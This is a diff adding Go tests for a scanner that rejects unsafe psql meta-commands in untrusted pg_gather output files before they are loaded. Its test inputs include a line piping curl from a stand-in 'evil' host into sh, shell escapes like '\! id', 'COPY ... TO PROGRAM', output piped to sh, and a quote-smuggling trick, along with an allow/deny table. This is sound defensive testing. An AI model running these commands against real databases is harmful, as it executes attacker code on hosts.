@@ -111,6 +111,268 @@ func TestGatherDirHasScripts(t *testing.T) {
 }
 
 // ----------------------------------------------------------------- //
+// scanGatherInput (untrusted-input pre-scan)
+// ----------------------------------------------------------------- //
+
+// realisticOutTxt mirrors the shape a genuine pg_gather out.txt has
+// (gather.sql v33): header comment, benign display/guard
+// meta-commands, and COPY blocks whose data rows legitimately contain
+// backslash escapes, quotes, and the word "program".
+const realisticOutTxt = `--**** THIS IS A TSV FORMATED FILE. PLEASE DONT COPY-PASTE OR SAVE USING TEXT EDITORS. Because formatting can be lost and file becomes corrupt  ****--
+\r
+\set ver 33
+SELECT (SELECT count(*) > 1 FROM pg_srvr) AS conlines \gset
+\if :conlines
+\echo SOMETHING WRONG, EXITING
+SOMETHING WRONG, EXITING;
+\q
+\endif
+COPY pg_srvr FROM stdin;
+You are connected to database "postgres" as user "acme" via socket in "/tmp" at port "5432".
+psql - psql (PostgreSQL) 16.4
+\.
+\t
+\r
+COPY pg_get_confs (name,setting,unit,source) FROM stdin;
+archive_command	/usr/bin/program --flag 'x'	\N	configuration file
+search_path	"$user", public	\N	default
+log_line_prefix	%m [%p] \\ \.	\N	configuration file
+\.
+copy pg_get_activity FROM stdin;
+12345	SELECT * FROM t WHERE c = 'program' /* odd */ AND d = $$x$$;	` + "`whoami`" + `
+\.
+`
+
+// writeScanInput drops content into a temp out.txt and returns its
+// path.
+func writeScanInput(t *testing.T, content string) string {
+	t.Helper()
+	p := filepath.Join(t.TempDir(), "out.txt")
+	if err := os.WriteFile(p, []byte(content), 0o644); err != nil {
+		t.Fatalf("write input: %v", err)
+	}
+	return p
+}
+
+func TestScanGatherInputAcceptsRealisticFile(t *testing.T) {
+	if err := scanGatherInput(writeScanInput(t, realisticOutTxt)); err != nil {
+		t.Fatalf("realistic out.txt rejected: %v", err)
+	}
+}
+
+func TestScanGatherInputAcceptsFileWithoutTrailingNewline(t *testing.T) {
+	// The last line may lack a trailing \n; it must still be scanned
+	// (an attacker would otherwise hide the payload on the final line).
+	if err := scanGatherInput(writeScanInput(t, "SELECT 1;\nSELECT 2;")); err != nil {
+		t.Fatalf("no-trailing-newline file rejected: %v", err)
+	}
+	err := scanGatherInput(writeScanInput(t, "SELECT 1;\n\\! id"))
+	if err == nil {
+		t.Fatal("final-line \\! without newline must be rejected")
+	}
+	if !strings.Contains(err.Error(), "line 2") {
+		t.Errorf("error does not name line 2: %v", err)
+	}
+}
+
+func TestScanGatherInputRejectsShellMetaCommand(t *testing.T) {
+	err := scanGatherInput(writeScanInput(t,
+		"\\set ver 33\n\\! curl https://evil/x | sh\n"))
+	if err == nil {
+		t.Fatal("expected rejection of \\! line")
+	}
+	if !strings.Contains(err.Error(), "line 2") {
+		t.Errorf("error does not name the offending line: %v", err)
+	}
+	if got := ExitCodeFor(err); got != ui.ExitUsage {
+		t.Errorf("exit code: got %d, want %d (ExitUsage)", got, ui.ExitUsage)
+	}
+}
+
+func TestScanGatherInputRejectsMidLineMetaCommand(t *testing.T) {
+	// psql accepts meta-commands after SQL on the same line, so a
+	// leading-character check alone is bypassable.
+	err := scanGatherInput(writeScanInput(t, "SELECT 1; \\! id\n"))
+	if err == nil {
+		t.Fatal("expected rejection of mid-line \\!")
+	}
+	if !strings.Contains(err.Error(), "line 1") {
+		t.Errorf("error does not name line 1: %v", err)
+	}
+}
+
+func TestScanGatherInputRejectsToProgram(t *testing.T) {
+	for name, content := range map[string]string{
+		"same line":  "COPY x TO PROGRAM 'touch /tmp/pwned';\n",
+		"lowercase":  "copy x to program 'touch /tmp/pwned';\n",
+		"line split": "COPY x TO\nPROGRAM 'touch /tmp/pwned';\n",
+	} {
+		if err := scanGatherInput(writeScanInput(t, content)); err == nil {
+			t.Errorf("%s: expected rejection of COPY ... PROGRAM", name)
+		}
+	}
+}
+
+func TestScanGatherInputAllowsCopyDataFreely(t *testing.T) {
+	// Inside a COPY block, data rows legitimately contain backslash
+	// escapes, the word "program", quotes, and backquotes — none may
+	// be flagged, and the \. terminator must be honored.
+	content := "COPY pg_get_confs FROM stdin;\n" +
+		"archive_command\tprogram TO PROGRAM \\! `id` '\" $$\n" +
+		"\\.\n"
+	if err := scanGatherInput(writeScanInput(t, content)); err != nil {
+		t.Fatalf("COPY data misflagged: %v", err)
+	}
+	// But the SAME bytes outside a COPY block are rejected.
+	if err := scanGatherInput(writeScanInput(t,
+		"archive_command\tprogram TO PROGRAM \\! `id` '\" $$\n")); err == nil {
+		t.Fatal("expected rejection outside COPY data")
+	}
+}
+
+func TestScanGatherInputRejectsAfterCopyTerminator(t *testing.T) {
+	// The scanner must leave COPY-data mode at \. — meta-commands
+	// after the terminator are back under scrutiny.
+	content := "COPY t FROM stdin;\nrow\n\\.\n\\! id\n"
+	err := scanGatherInput(writeScanInput(t, content))
+	if err == nil {
+		t.Fatal("expected rejection of \\! after COPY terminator")
+	}
+	if !strings.Contains(err.Error(), "line 4") {
+		t.Errorf("error does not name line 4: %v", err)
+	}
+}
+
+func TestScanGatherInputRejectsStringSmuggledCopyStart(t *testing.T) {
+	// A multi-line string literal could hide a fake `COPY ... FROM
+	// stdin;` line, desynchronizing the scanner's COPY-data tracking
+	// from psql's; quotes outside COPY data are therefore rejected.
+	content := "SELECT '\nCOPY x FROM stdin;\n';\n\\! id\n"
+	err := scanGatherInput(writeScanInput(t, content))
+	if err == nil {
+		t.Fatal("expected rejection of quote outside COPY data")
+	}
+	if !strings.Contains(err.Error(), "line 1") {
+		t.Errorf("error does not name line 1 (the smuggling quote): %v", err)
+	}
+}
+
+func TestScanGatherInputRejectsBackquote(t *testing.T) {
+	if err := scanGatherInput(writeScanInput(t, "\\echo `id`\n")); err == nil {
+		t.Fatal("expected rejection of backquote in meta-command args")
+	}
+}
+
+func TestScanGatherInputMissingFile(t *testing.T) {
+	err := scanGatherInput(filepath.Join(t.TempDir(), "nope.txt"))
+	if err == nil {
+		t.Fatal("expected error for missing file")
+	}
+}
+
+func TestScanGatherLineVerbExtraction(t *testing.T) {
+	// Table-driven check of the meta-command allow/deny decisions.
+	cases := []struct {
+		line string
+		ok   bool
+	}{
+		{`\.`, true},
+		{`\set ver 33`, true},
+		{`\if :conlines`, true},
+		{`\endif`, true},
+		{`\echo SOMETHING WRONG, EXITING`, true},
+		{`\q`, true},
+		{`\r`, true},
+		{`\t`, true},
+		{`SELECT 1 AS x \gset`, true},
+		{`\!`, false},
+		{`\! id`, false},
+		{`\g |cat`, false},
+		{`\gx`, false},
+		{`\gexec`, false},
+		{`\copy t from program 'id'`, false},
+		{`\o |sh`, false},
+		{`\w |sh`, false},
+		{`\`, false},
+		{`\\`, false},
+		{`\SET ver 33`, false}, // psql verbs are case-sensitive; only the real ones pass
+	}
+	for _, tc := range cases {
+		inCopy := false
+		err := scanGatherLine(tc.line+"\n", 1, &inCopy)
+		if tc.ok && err != nil {
+			t.Errorf("%q: unexpected rejection: %v", tc.line, err)
+		}
+		if !tc.ok && err == nil {
+			t.Errorf("%q: expected rejection", tc.line)
+		}
+	}
+}
+
+func TestScanGatherLineCopyModeTransitions(t *testing.T) {
+	inCopy := false
+	if err := scanGatherLine("COPY pg_srvr FROM stdin;\n", 1, &inCopy); err != nil {
+		t.Fatalf("COPY start rejected: %v", err)
+	}
+	if !inCopy {
+		t.Fatal("COPY ... FROM stdin; did not enter COPY-data mode")
+	}
+	// An escaped-backslash row (`\\.`) is data, not a terminator.
+	if err := scanGatherLine("\\\\.\n", 2, &inCopy); err != nil || !inCopy {
+		t.Fatalf("escaped-backslash data row mishandled: err=%v inCopy=%v", err, inCopy)
+	}
+	if err := scanGatherLine("\\.\r\n", 3, &inCopy); err != nil {
+		t.Fatalf("CRLF terminator rejected: %v", err)
+	}
+	if inCopy {
+		t.Fatal("\\. did not leave COPY-data mode")
+	}
+}
+
+// TestGenerateRejectsUnsafeInputBeforeDeploy proves the pre-scan
+// fires BEFORE any sandbox is deployed: no runner calls, no
+// LeftoverError, no _report_* dir under the root.
+func TestGenerateRejectsUnsafeInputBeforeDeploy(t *testing.T) {
+	gatherDir := writeStubGatherDir(t)
+	root := t.TempDir()
+	binDir := filepath.Join(root, "bin")
+	_ = os.MkdirAll(binDir, 0o755)
+	in := writeScanInput(t, "\\! touch /tmp/pwned\n")
+	runner := fakeRunnerCannedPsql(nil, nil, 0)
+
+	_, err := Generate(context.Background(), Options{
+		InputPath:   in,
+		OutputPath:  filepath.Join(root, "report.html"),
+		BinDir:      binDir,
+		PgGatherDir: gatherDir,
+		SandboxRoot: root,
+		Runner:      runner,
+	}, io.Discard)
+	if err == nil {
+		t.Fatal("expected unsafe input to be rejected")
+	}
+	if got := ExitCodeFor(err); got != ui.ExitUsage {
+		t.Errorf("exit code: got %d, want %d (ExitUsage)", got, ui.ExitUsage)
+	}
+	var le *LeftoverError
+	if errors.As(err, &le) {
+		t.Errorf("rejection happened pre-deploy; no LeftoverError expected, got dir %q", le.Dir)
+	}
+	if len(runner.Calls) != 0 {
+		t.Errorf("no subprocess may run for rejected input; saw %d calls", len(runner.Calls))
+	}
+	entries, rerr := os.ReadDir(root)
+	if rerr != nil {
+		t.Fatalf("read root: %v", rerr)
+	}
+	for _, e := range entries {
+		if strings.HasPrefix(e.Name(), "_report_") {
+			t.Errorf("throwaway sandbox %q created for rejected input", e.Name())
+		}
+	}
+}
+
+// ----------------------------------------------------------------- //
 // validateOptions
 // ----------------------------------------------------------------- //
 
